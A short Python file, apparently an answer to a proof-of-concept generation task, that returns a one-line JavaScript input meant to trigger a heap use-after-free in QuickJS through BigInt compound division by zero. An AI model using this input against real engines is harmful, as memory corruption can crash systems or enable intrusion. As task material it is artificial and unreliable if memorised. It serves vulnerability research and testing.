import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to a Heap Use-After-Free in QuickJS 
        (and potentially other engines like JerryScript) triggered by compound 
        assignment division by zero on BigInt values. The engine may free the 
        variable's old value before handling the division-by-zero exception correctly,
        leading to a use-after-free when the variable is accessed or cleaned up.
        """
        # Minimal PoC:
        # 1. Initialize a BigInt variable.
        # 2. Perform compound division by 0n inside a try/catch block.
        # 3. Access the variable in the catch block to trigger the UAF if not triggered immediately.
        return b"var x=1n;try{x/=0n}catch(e){x}"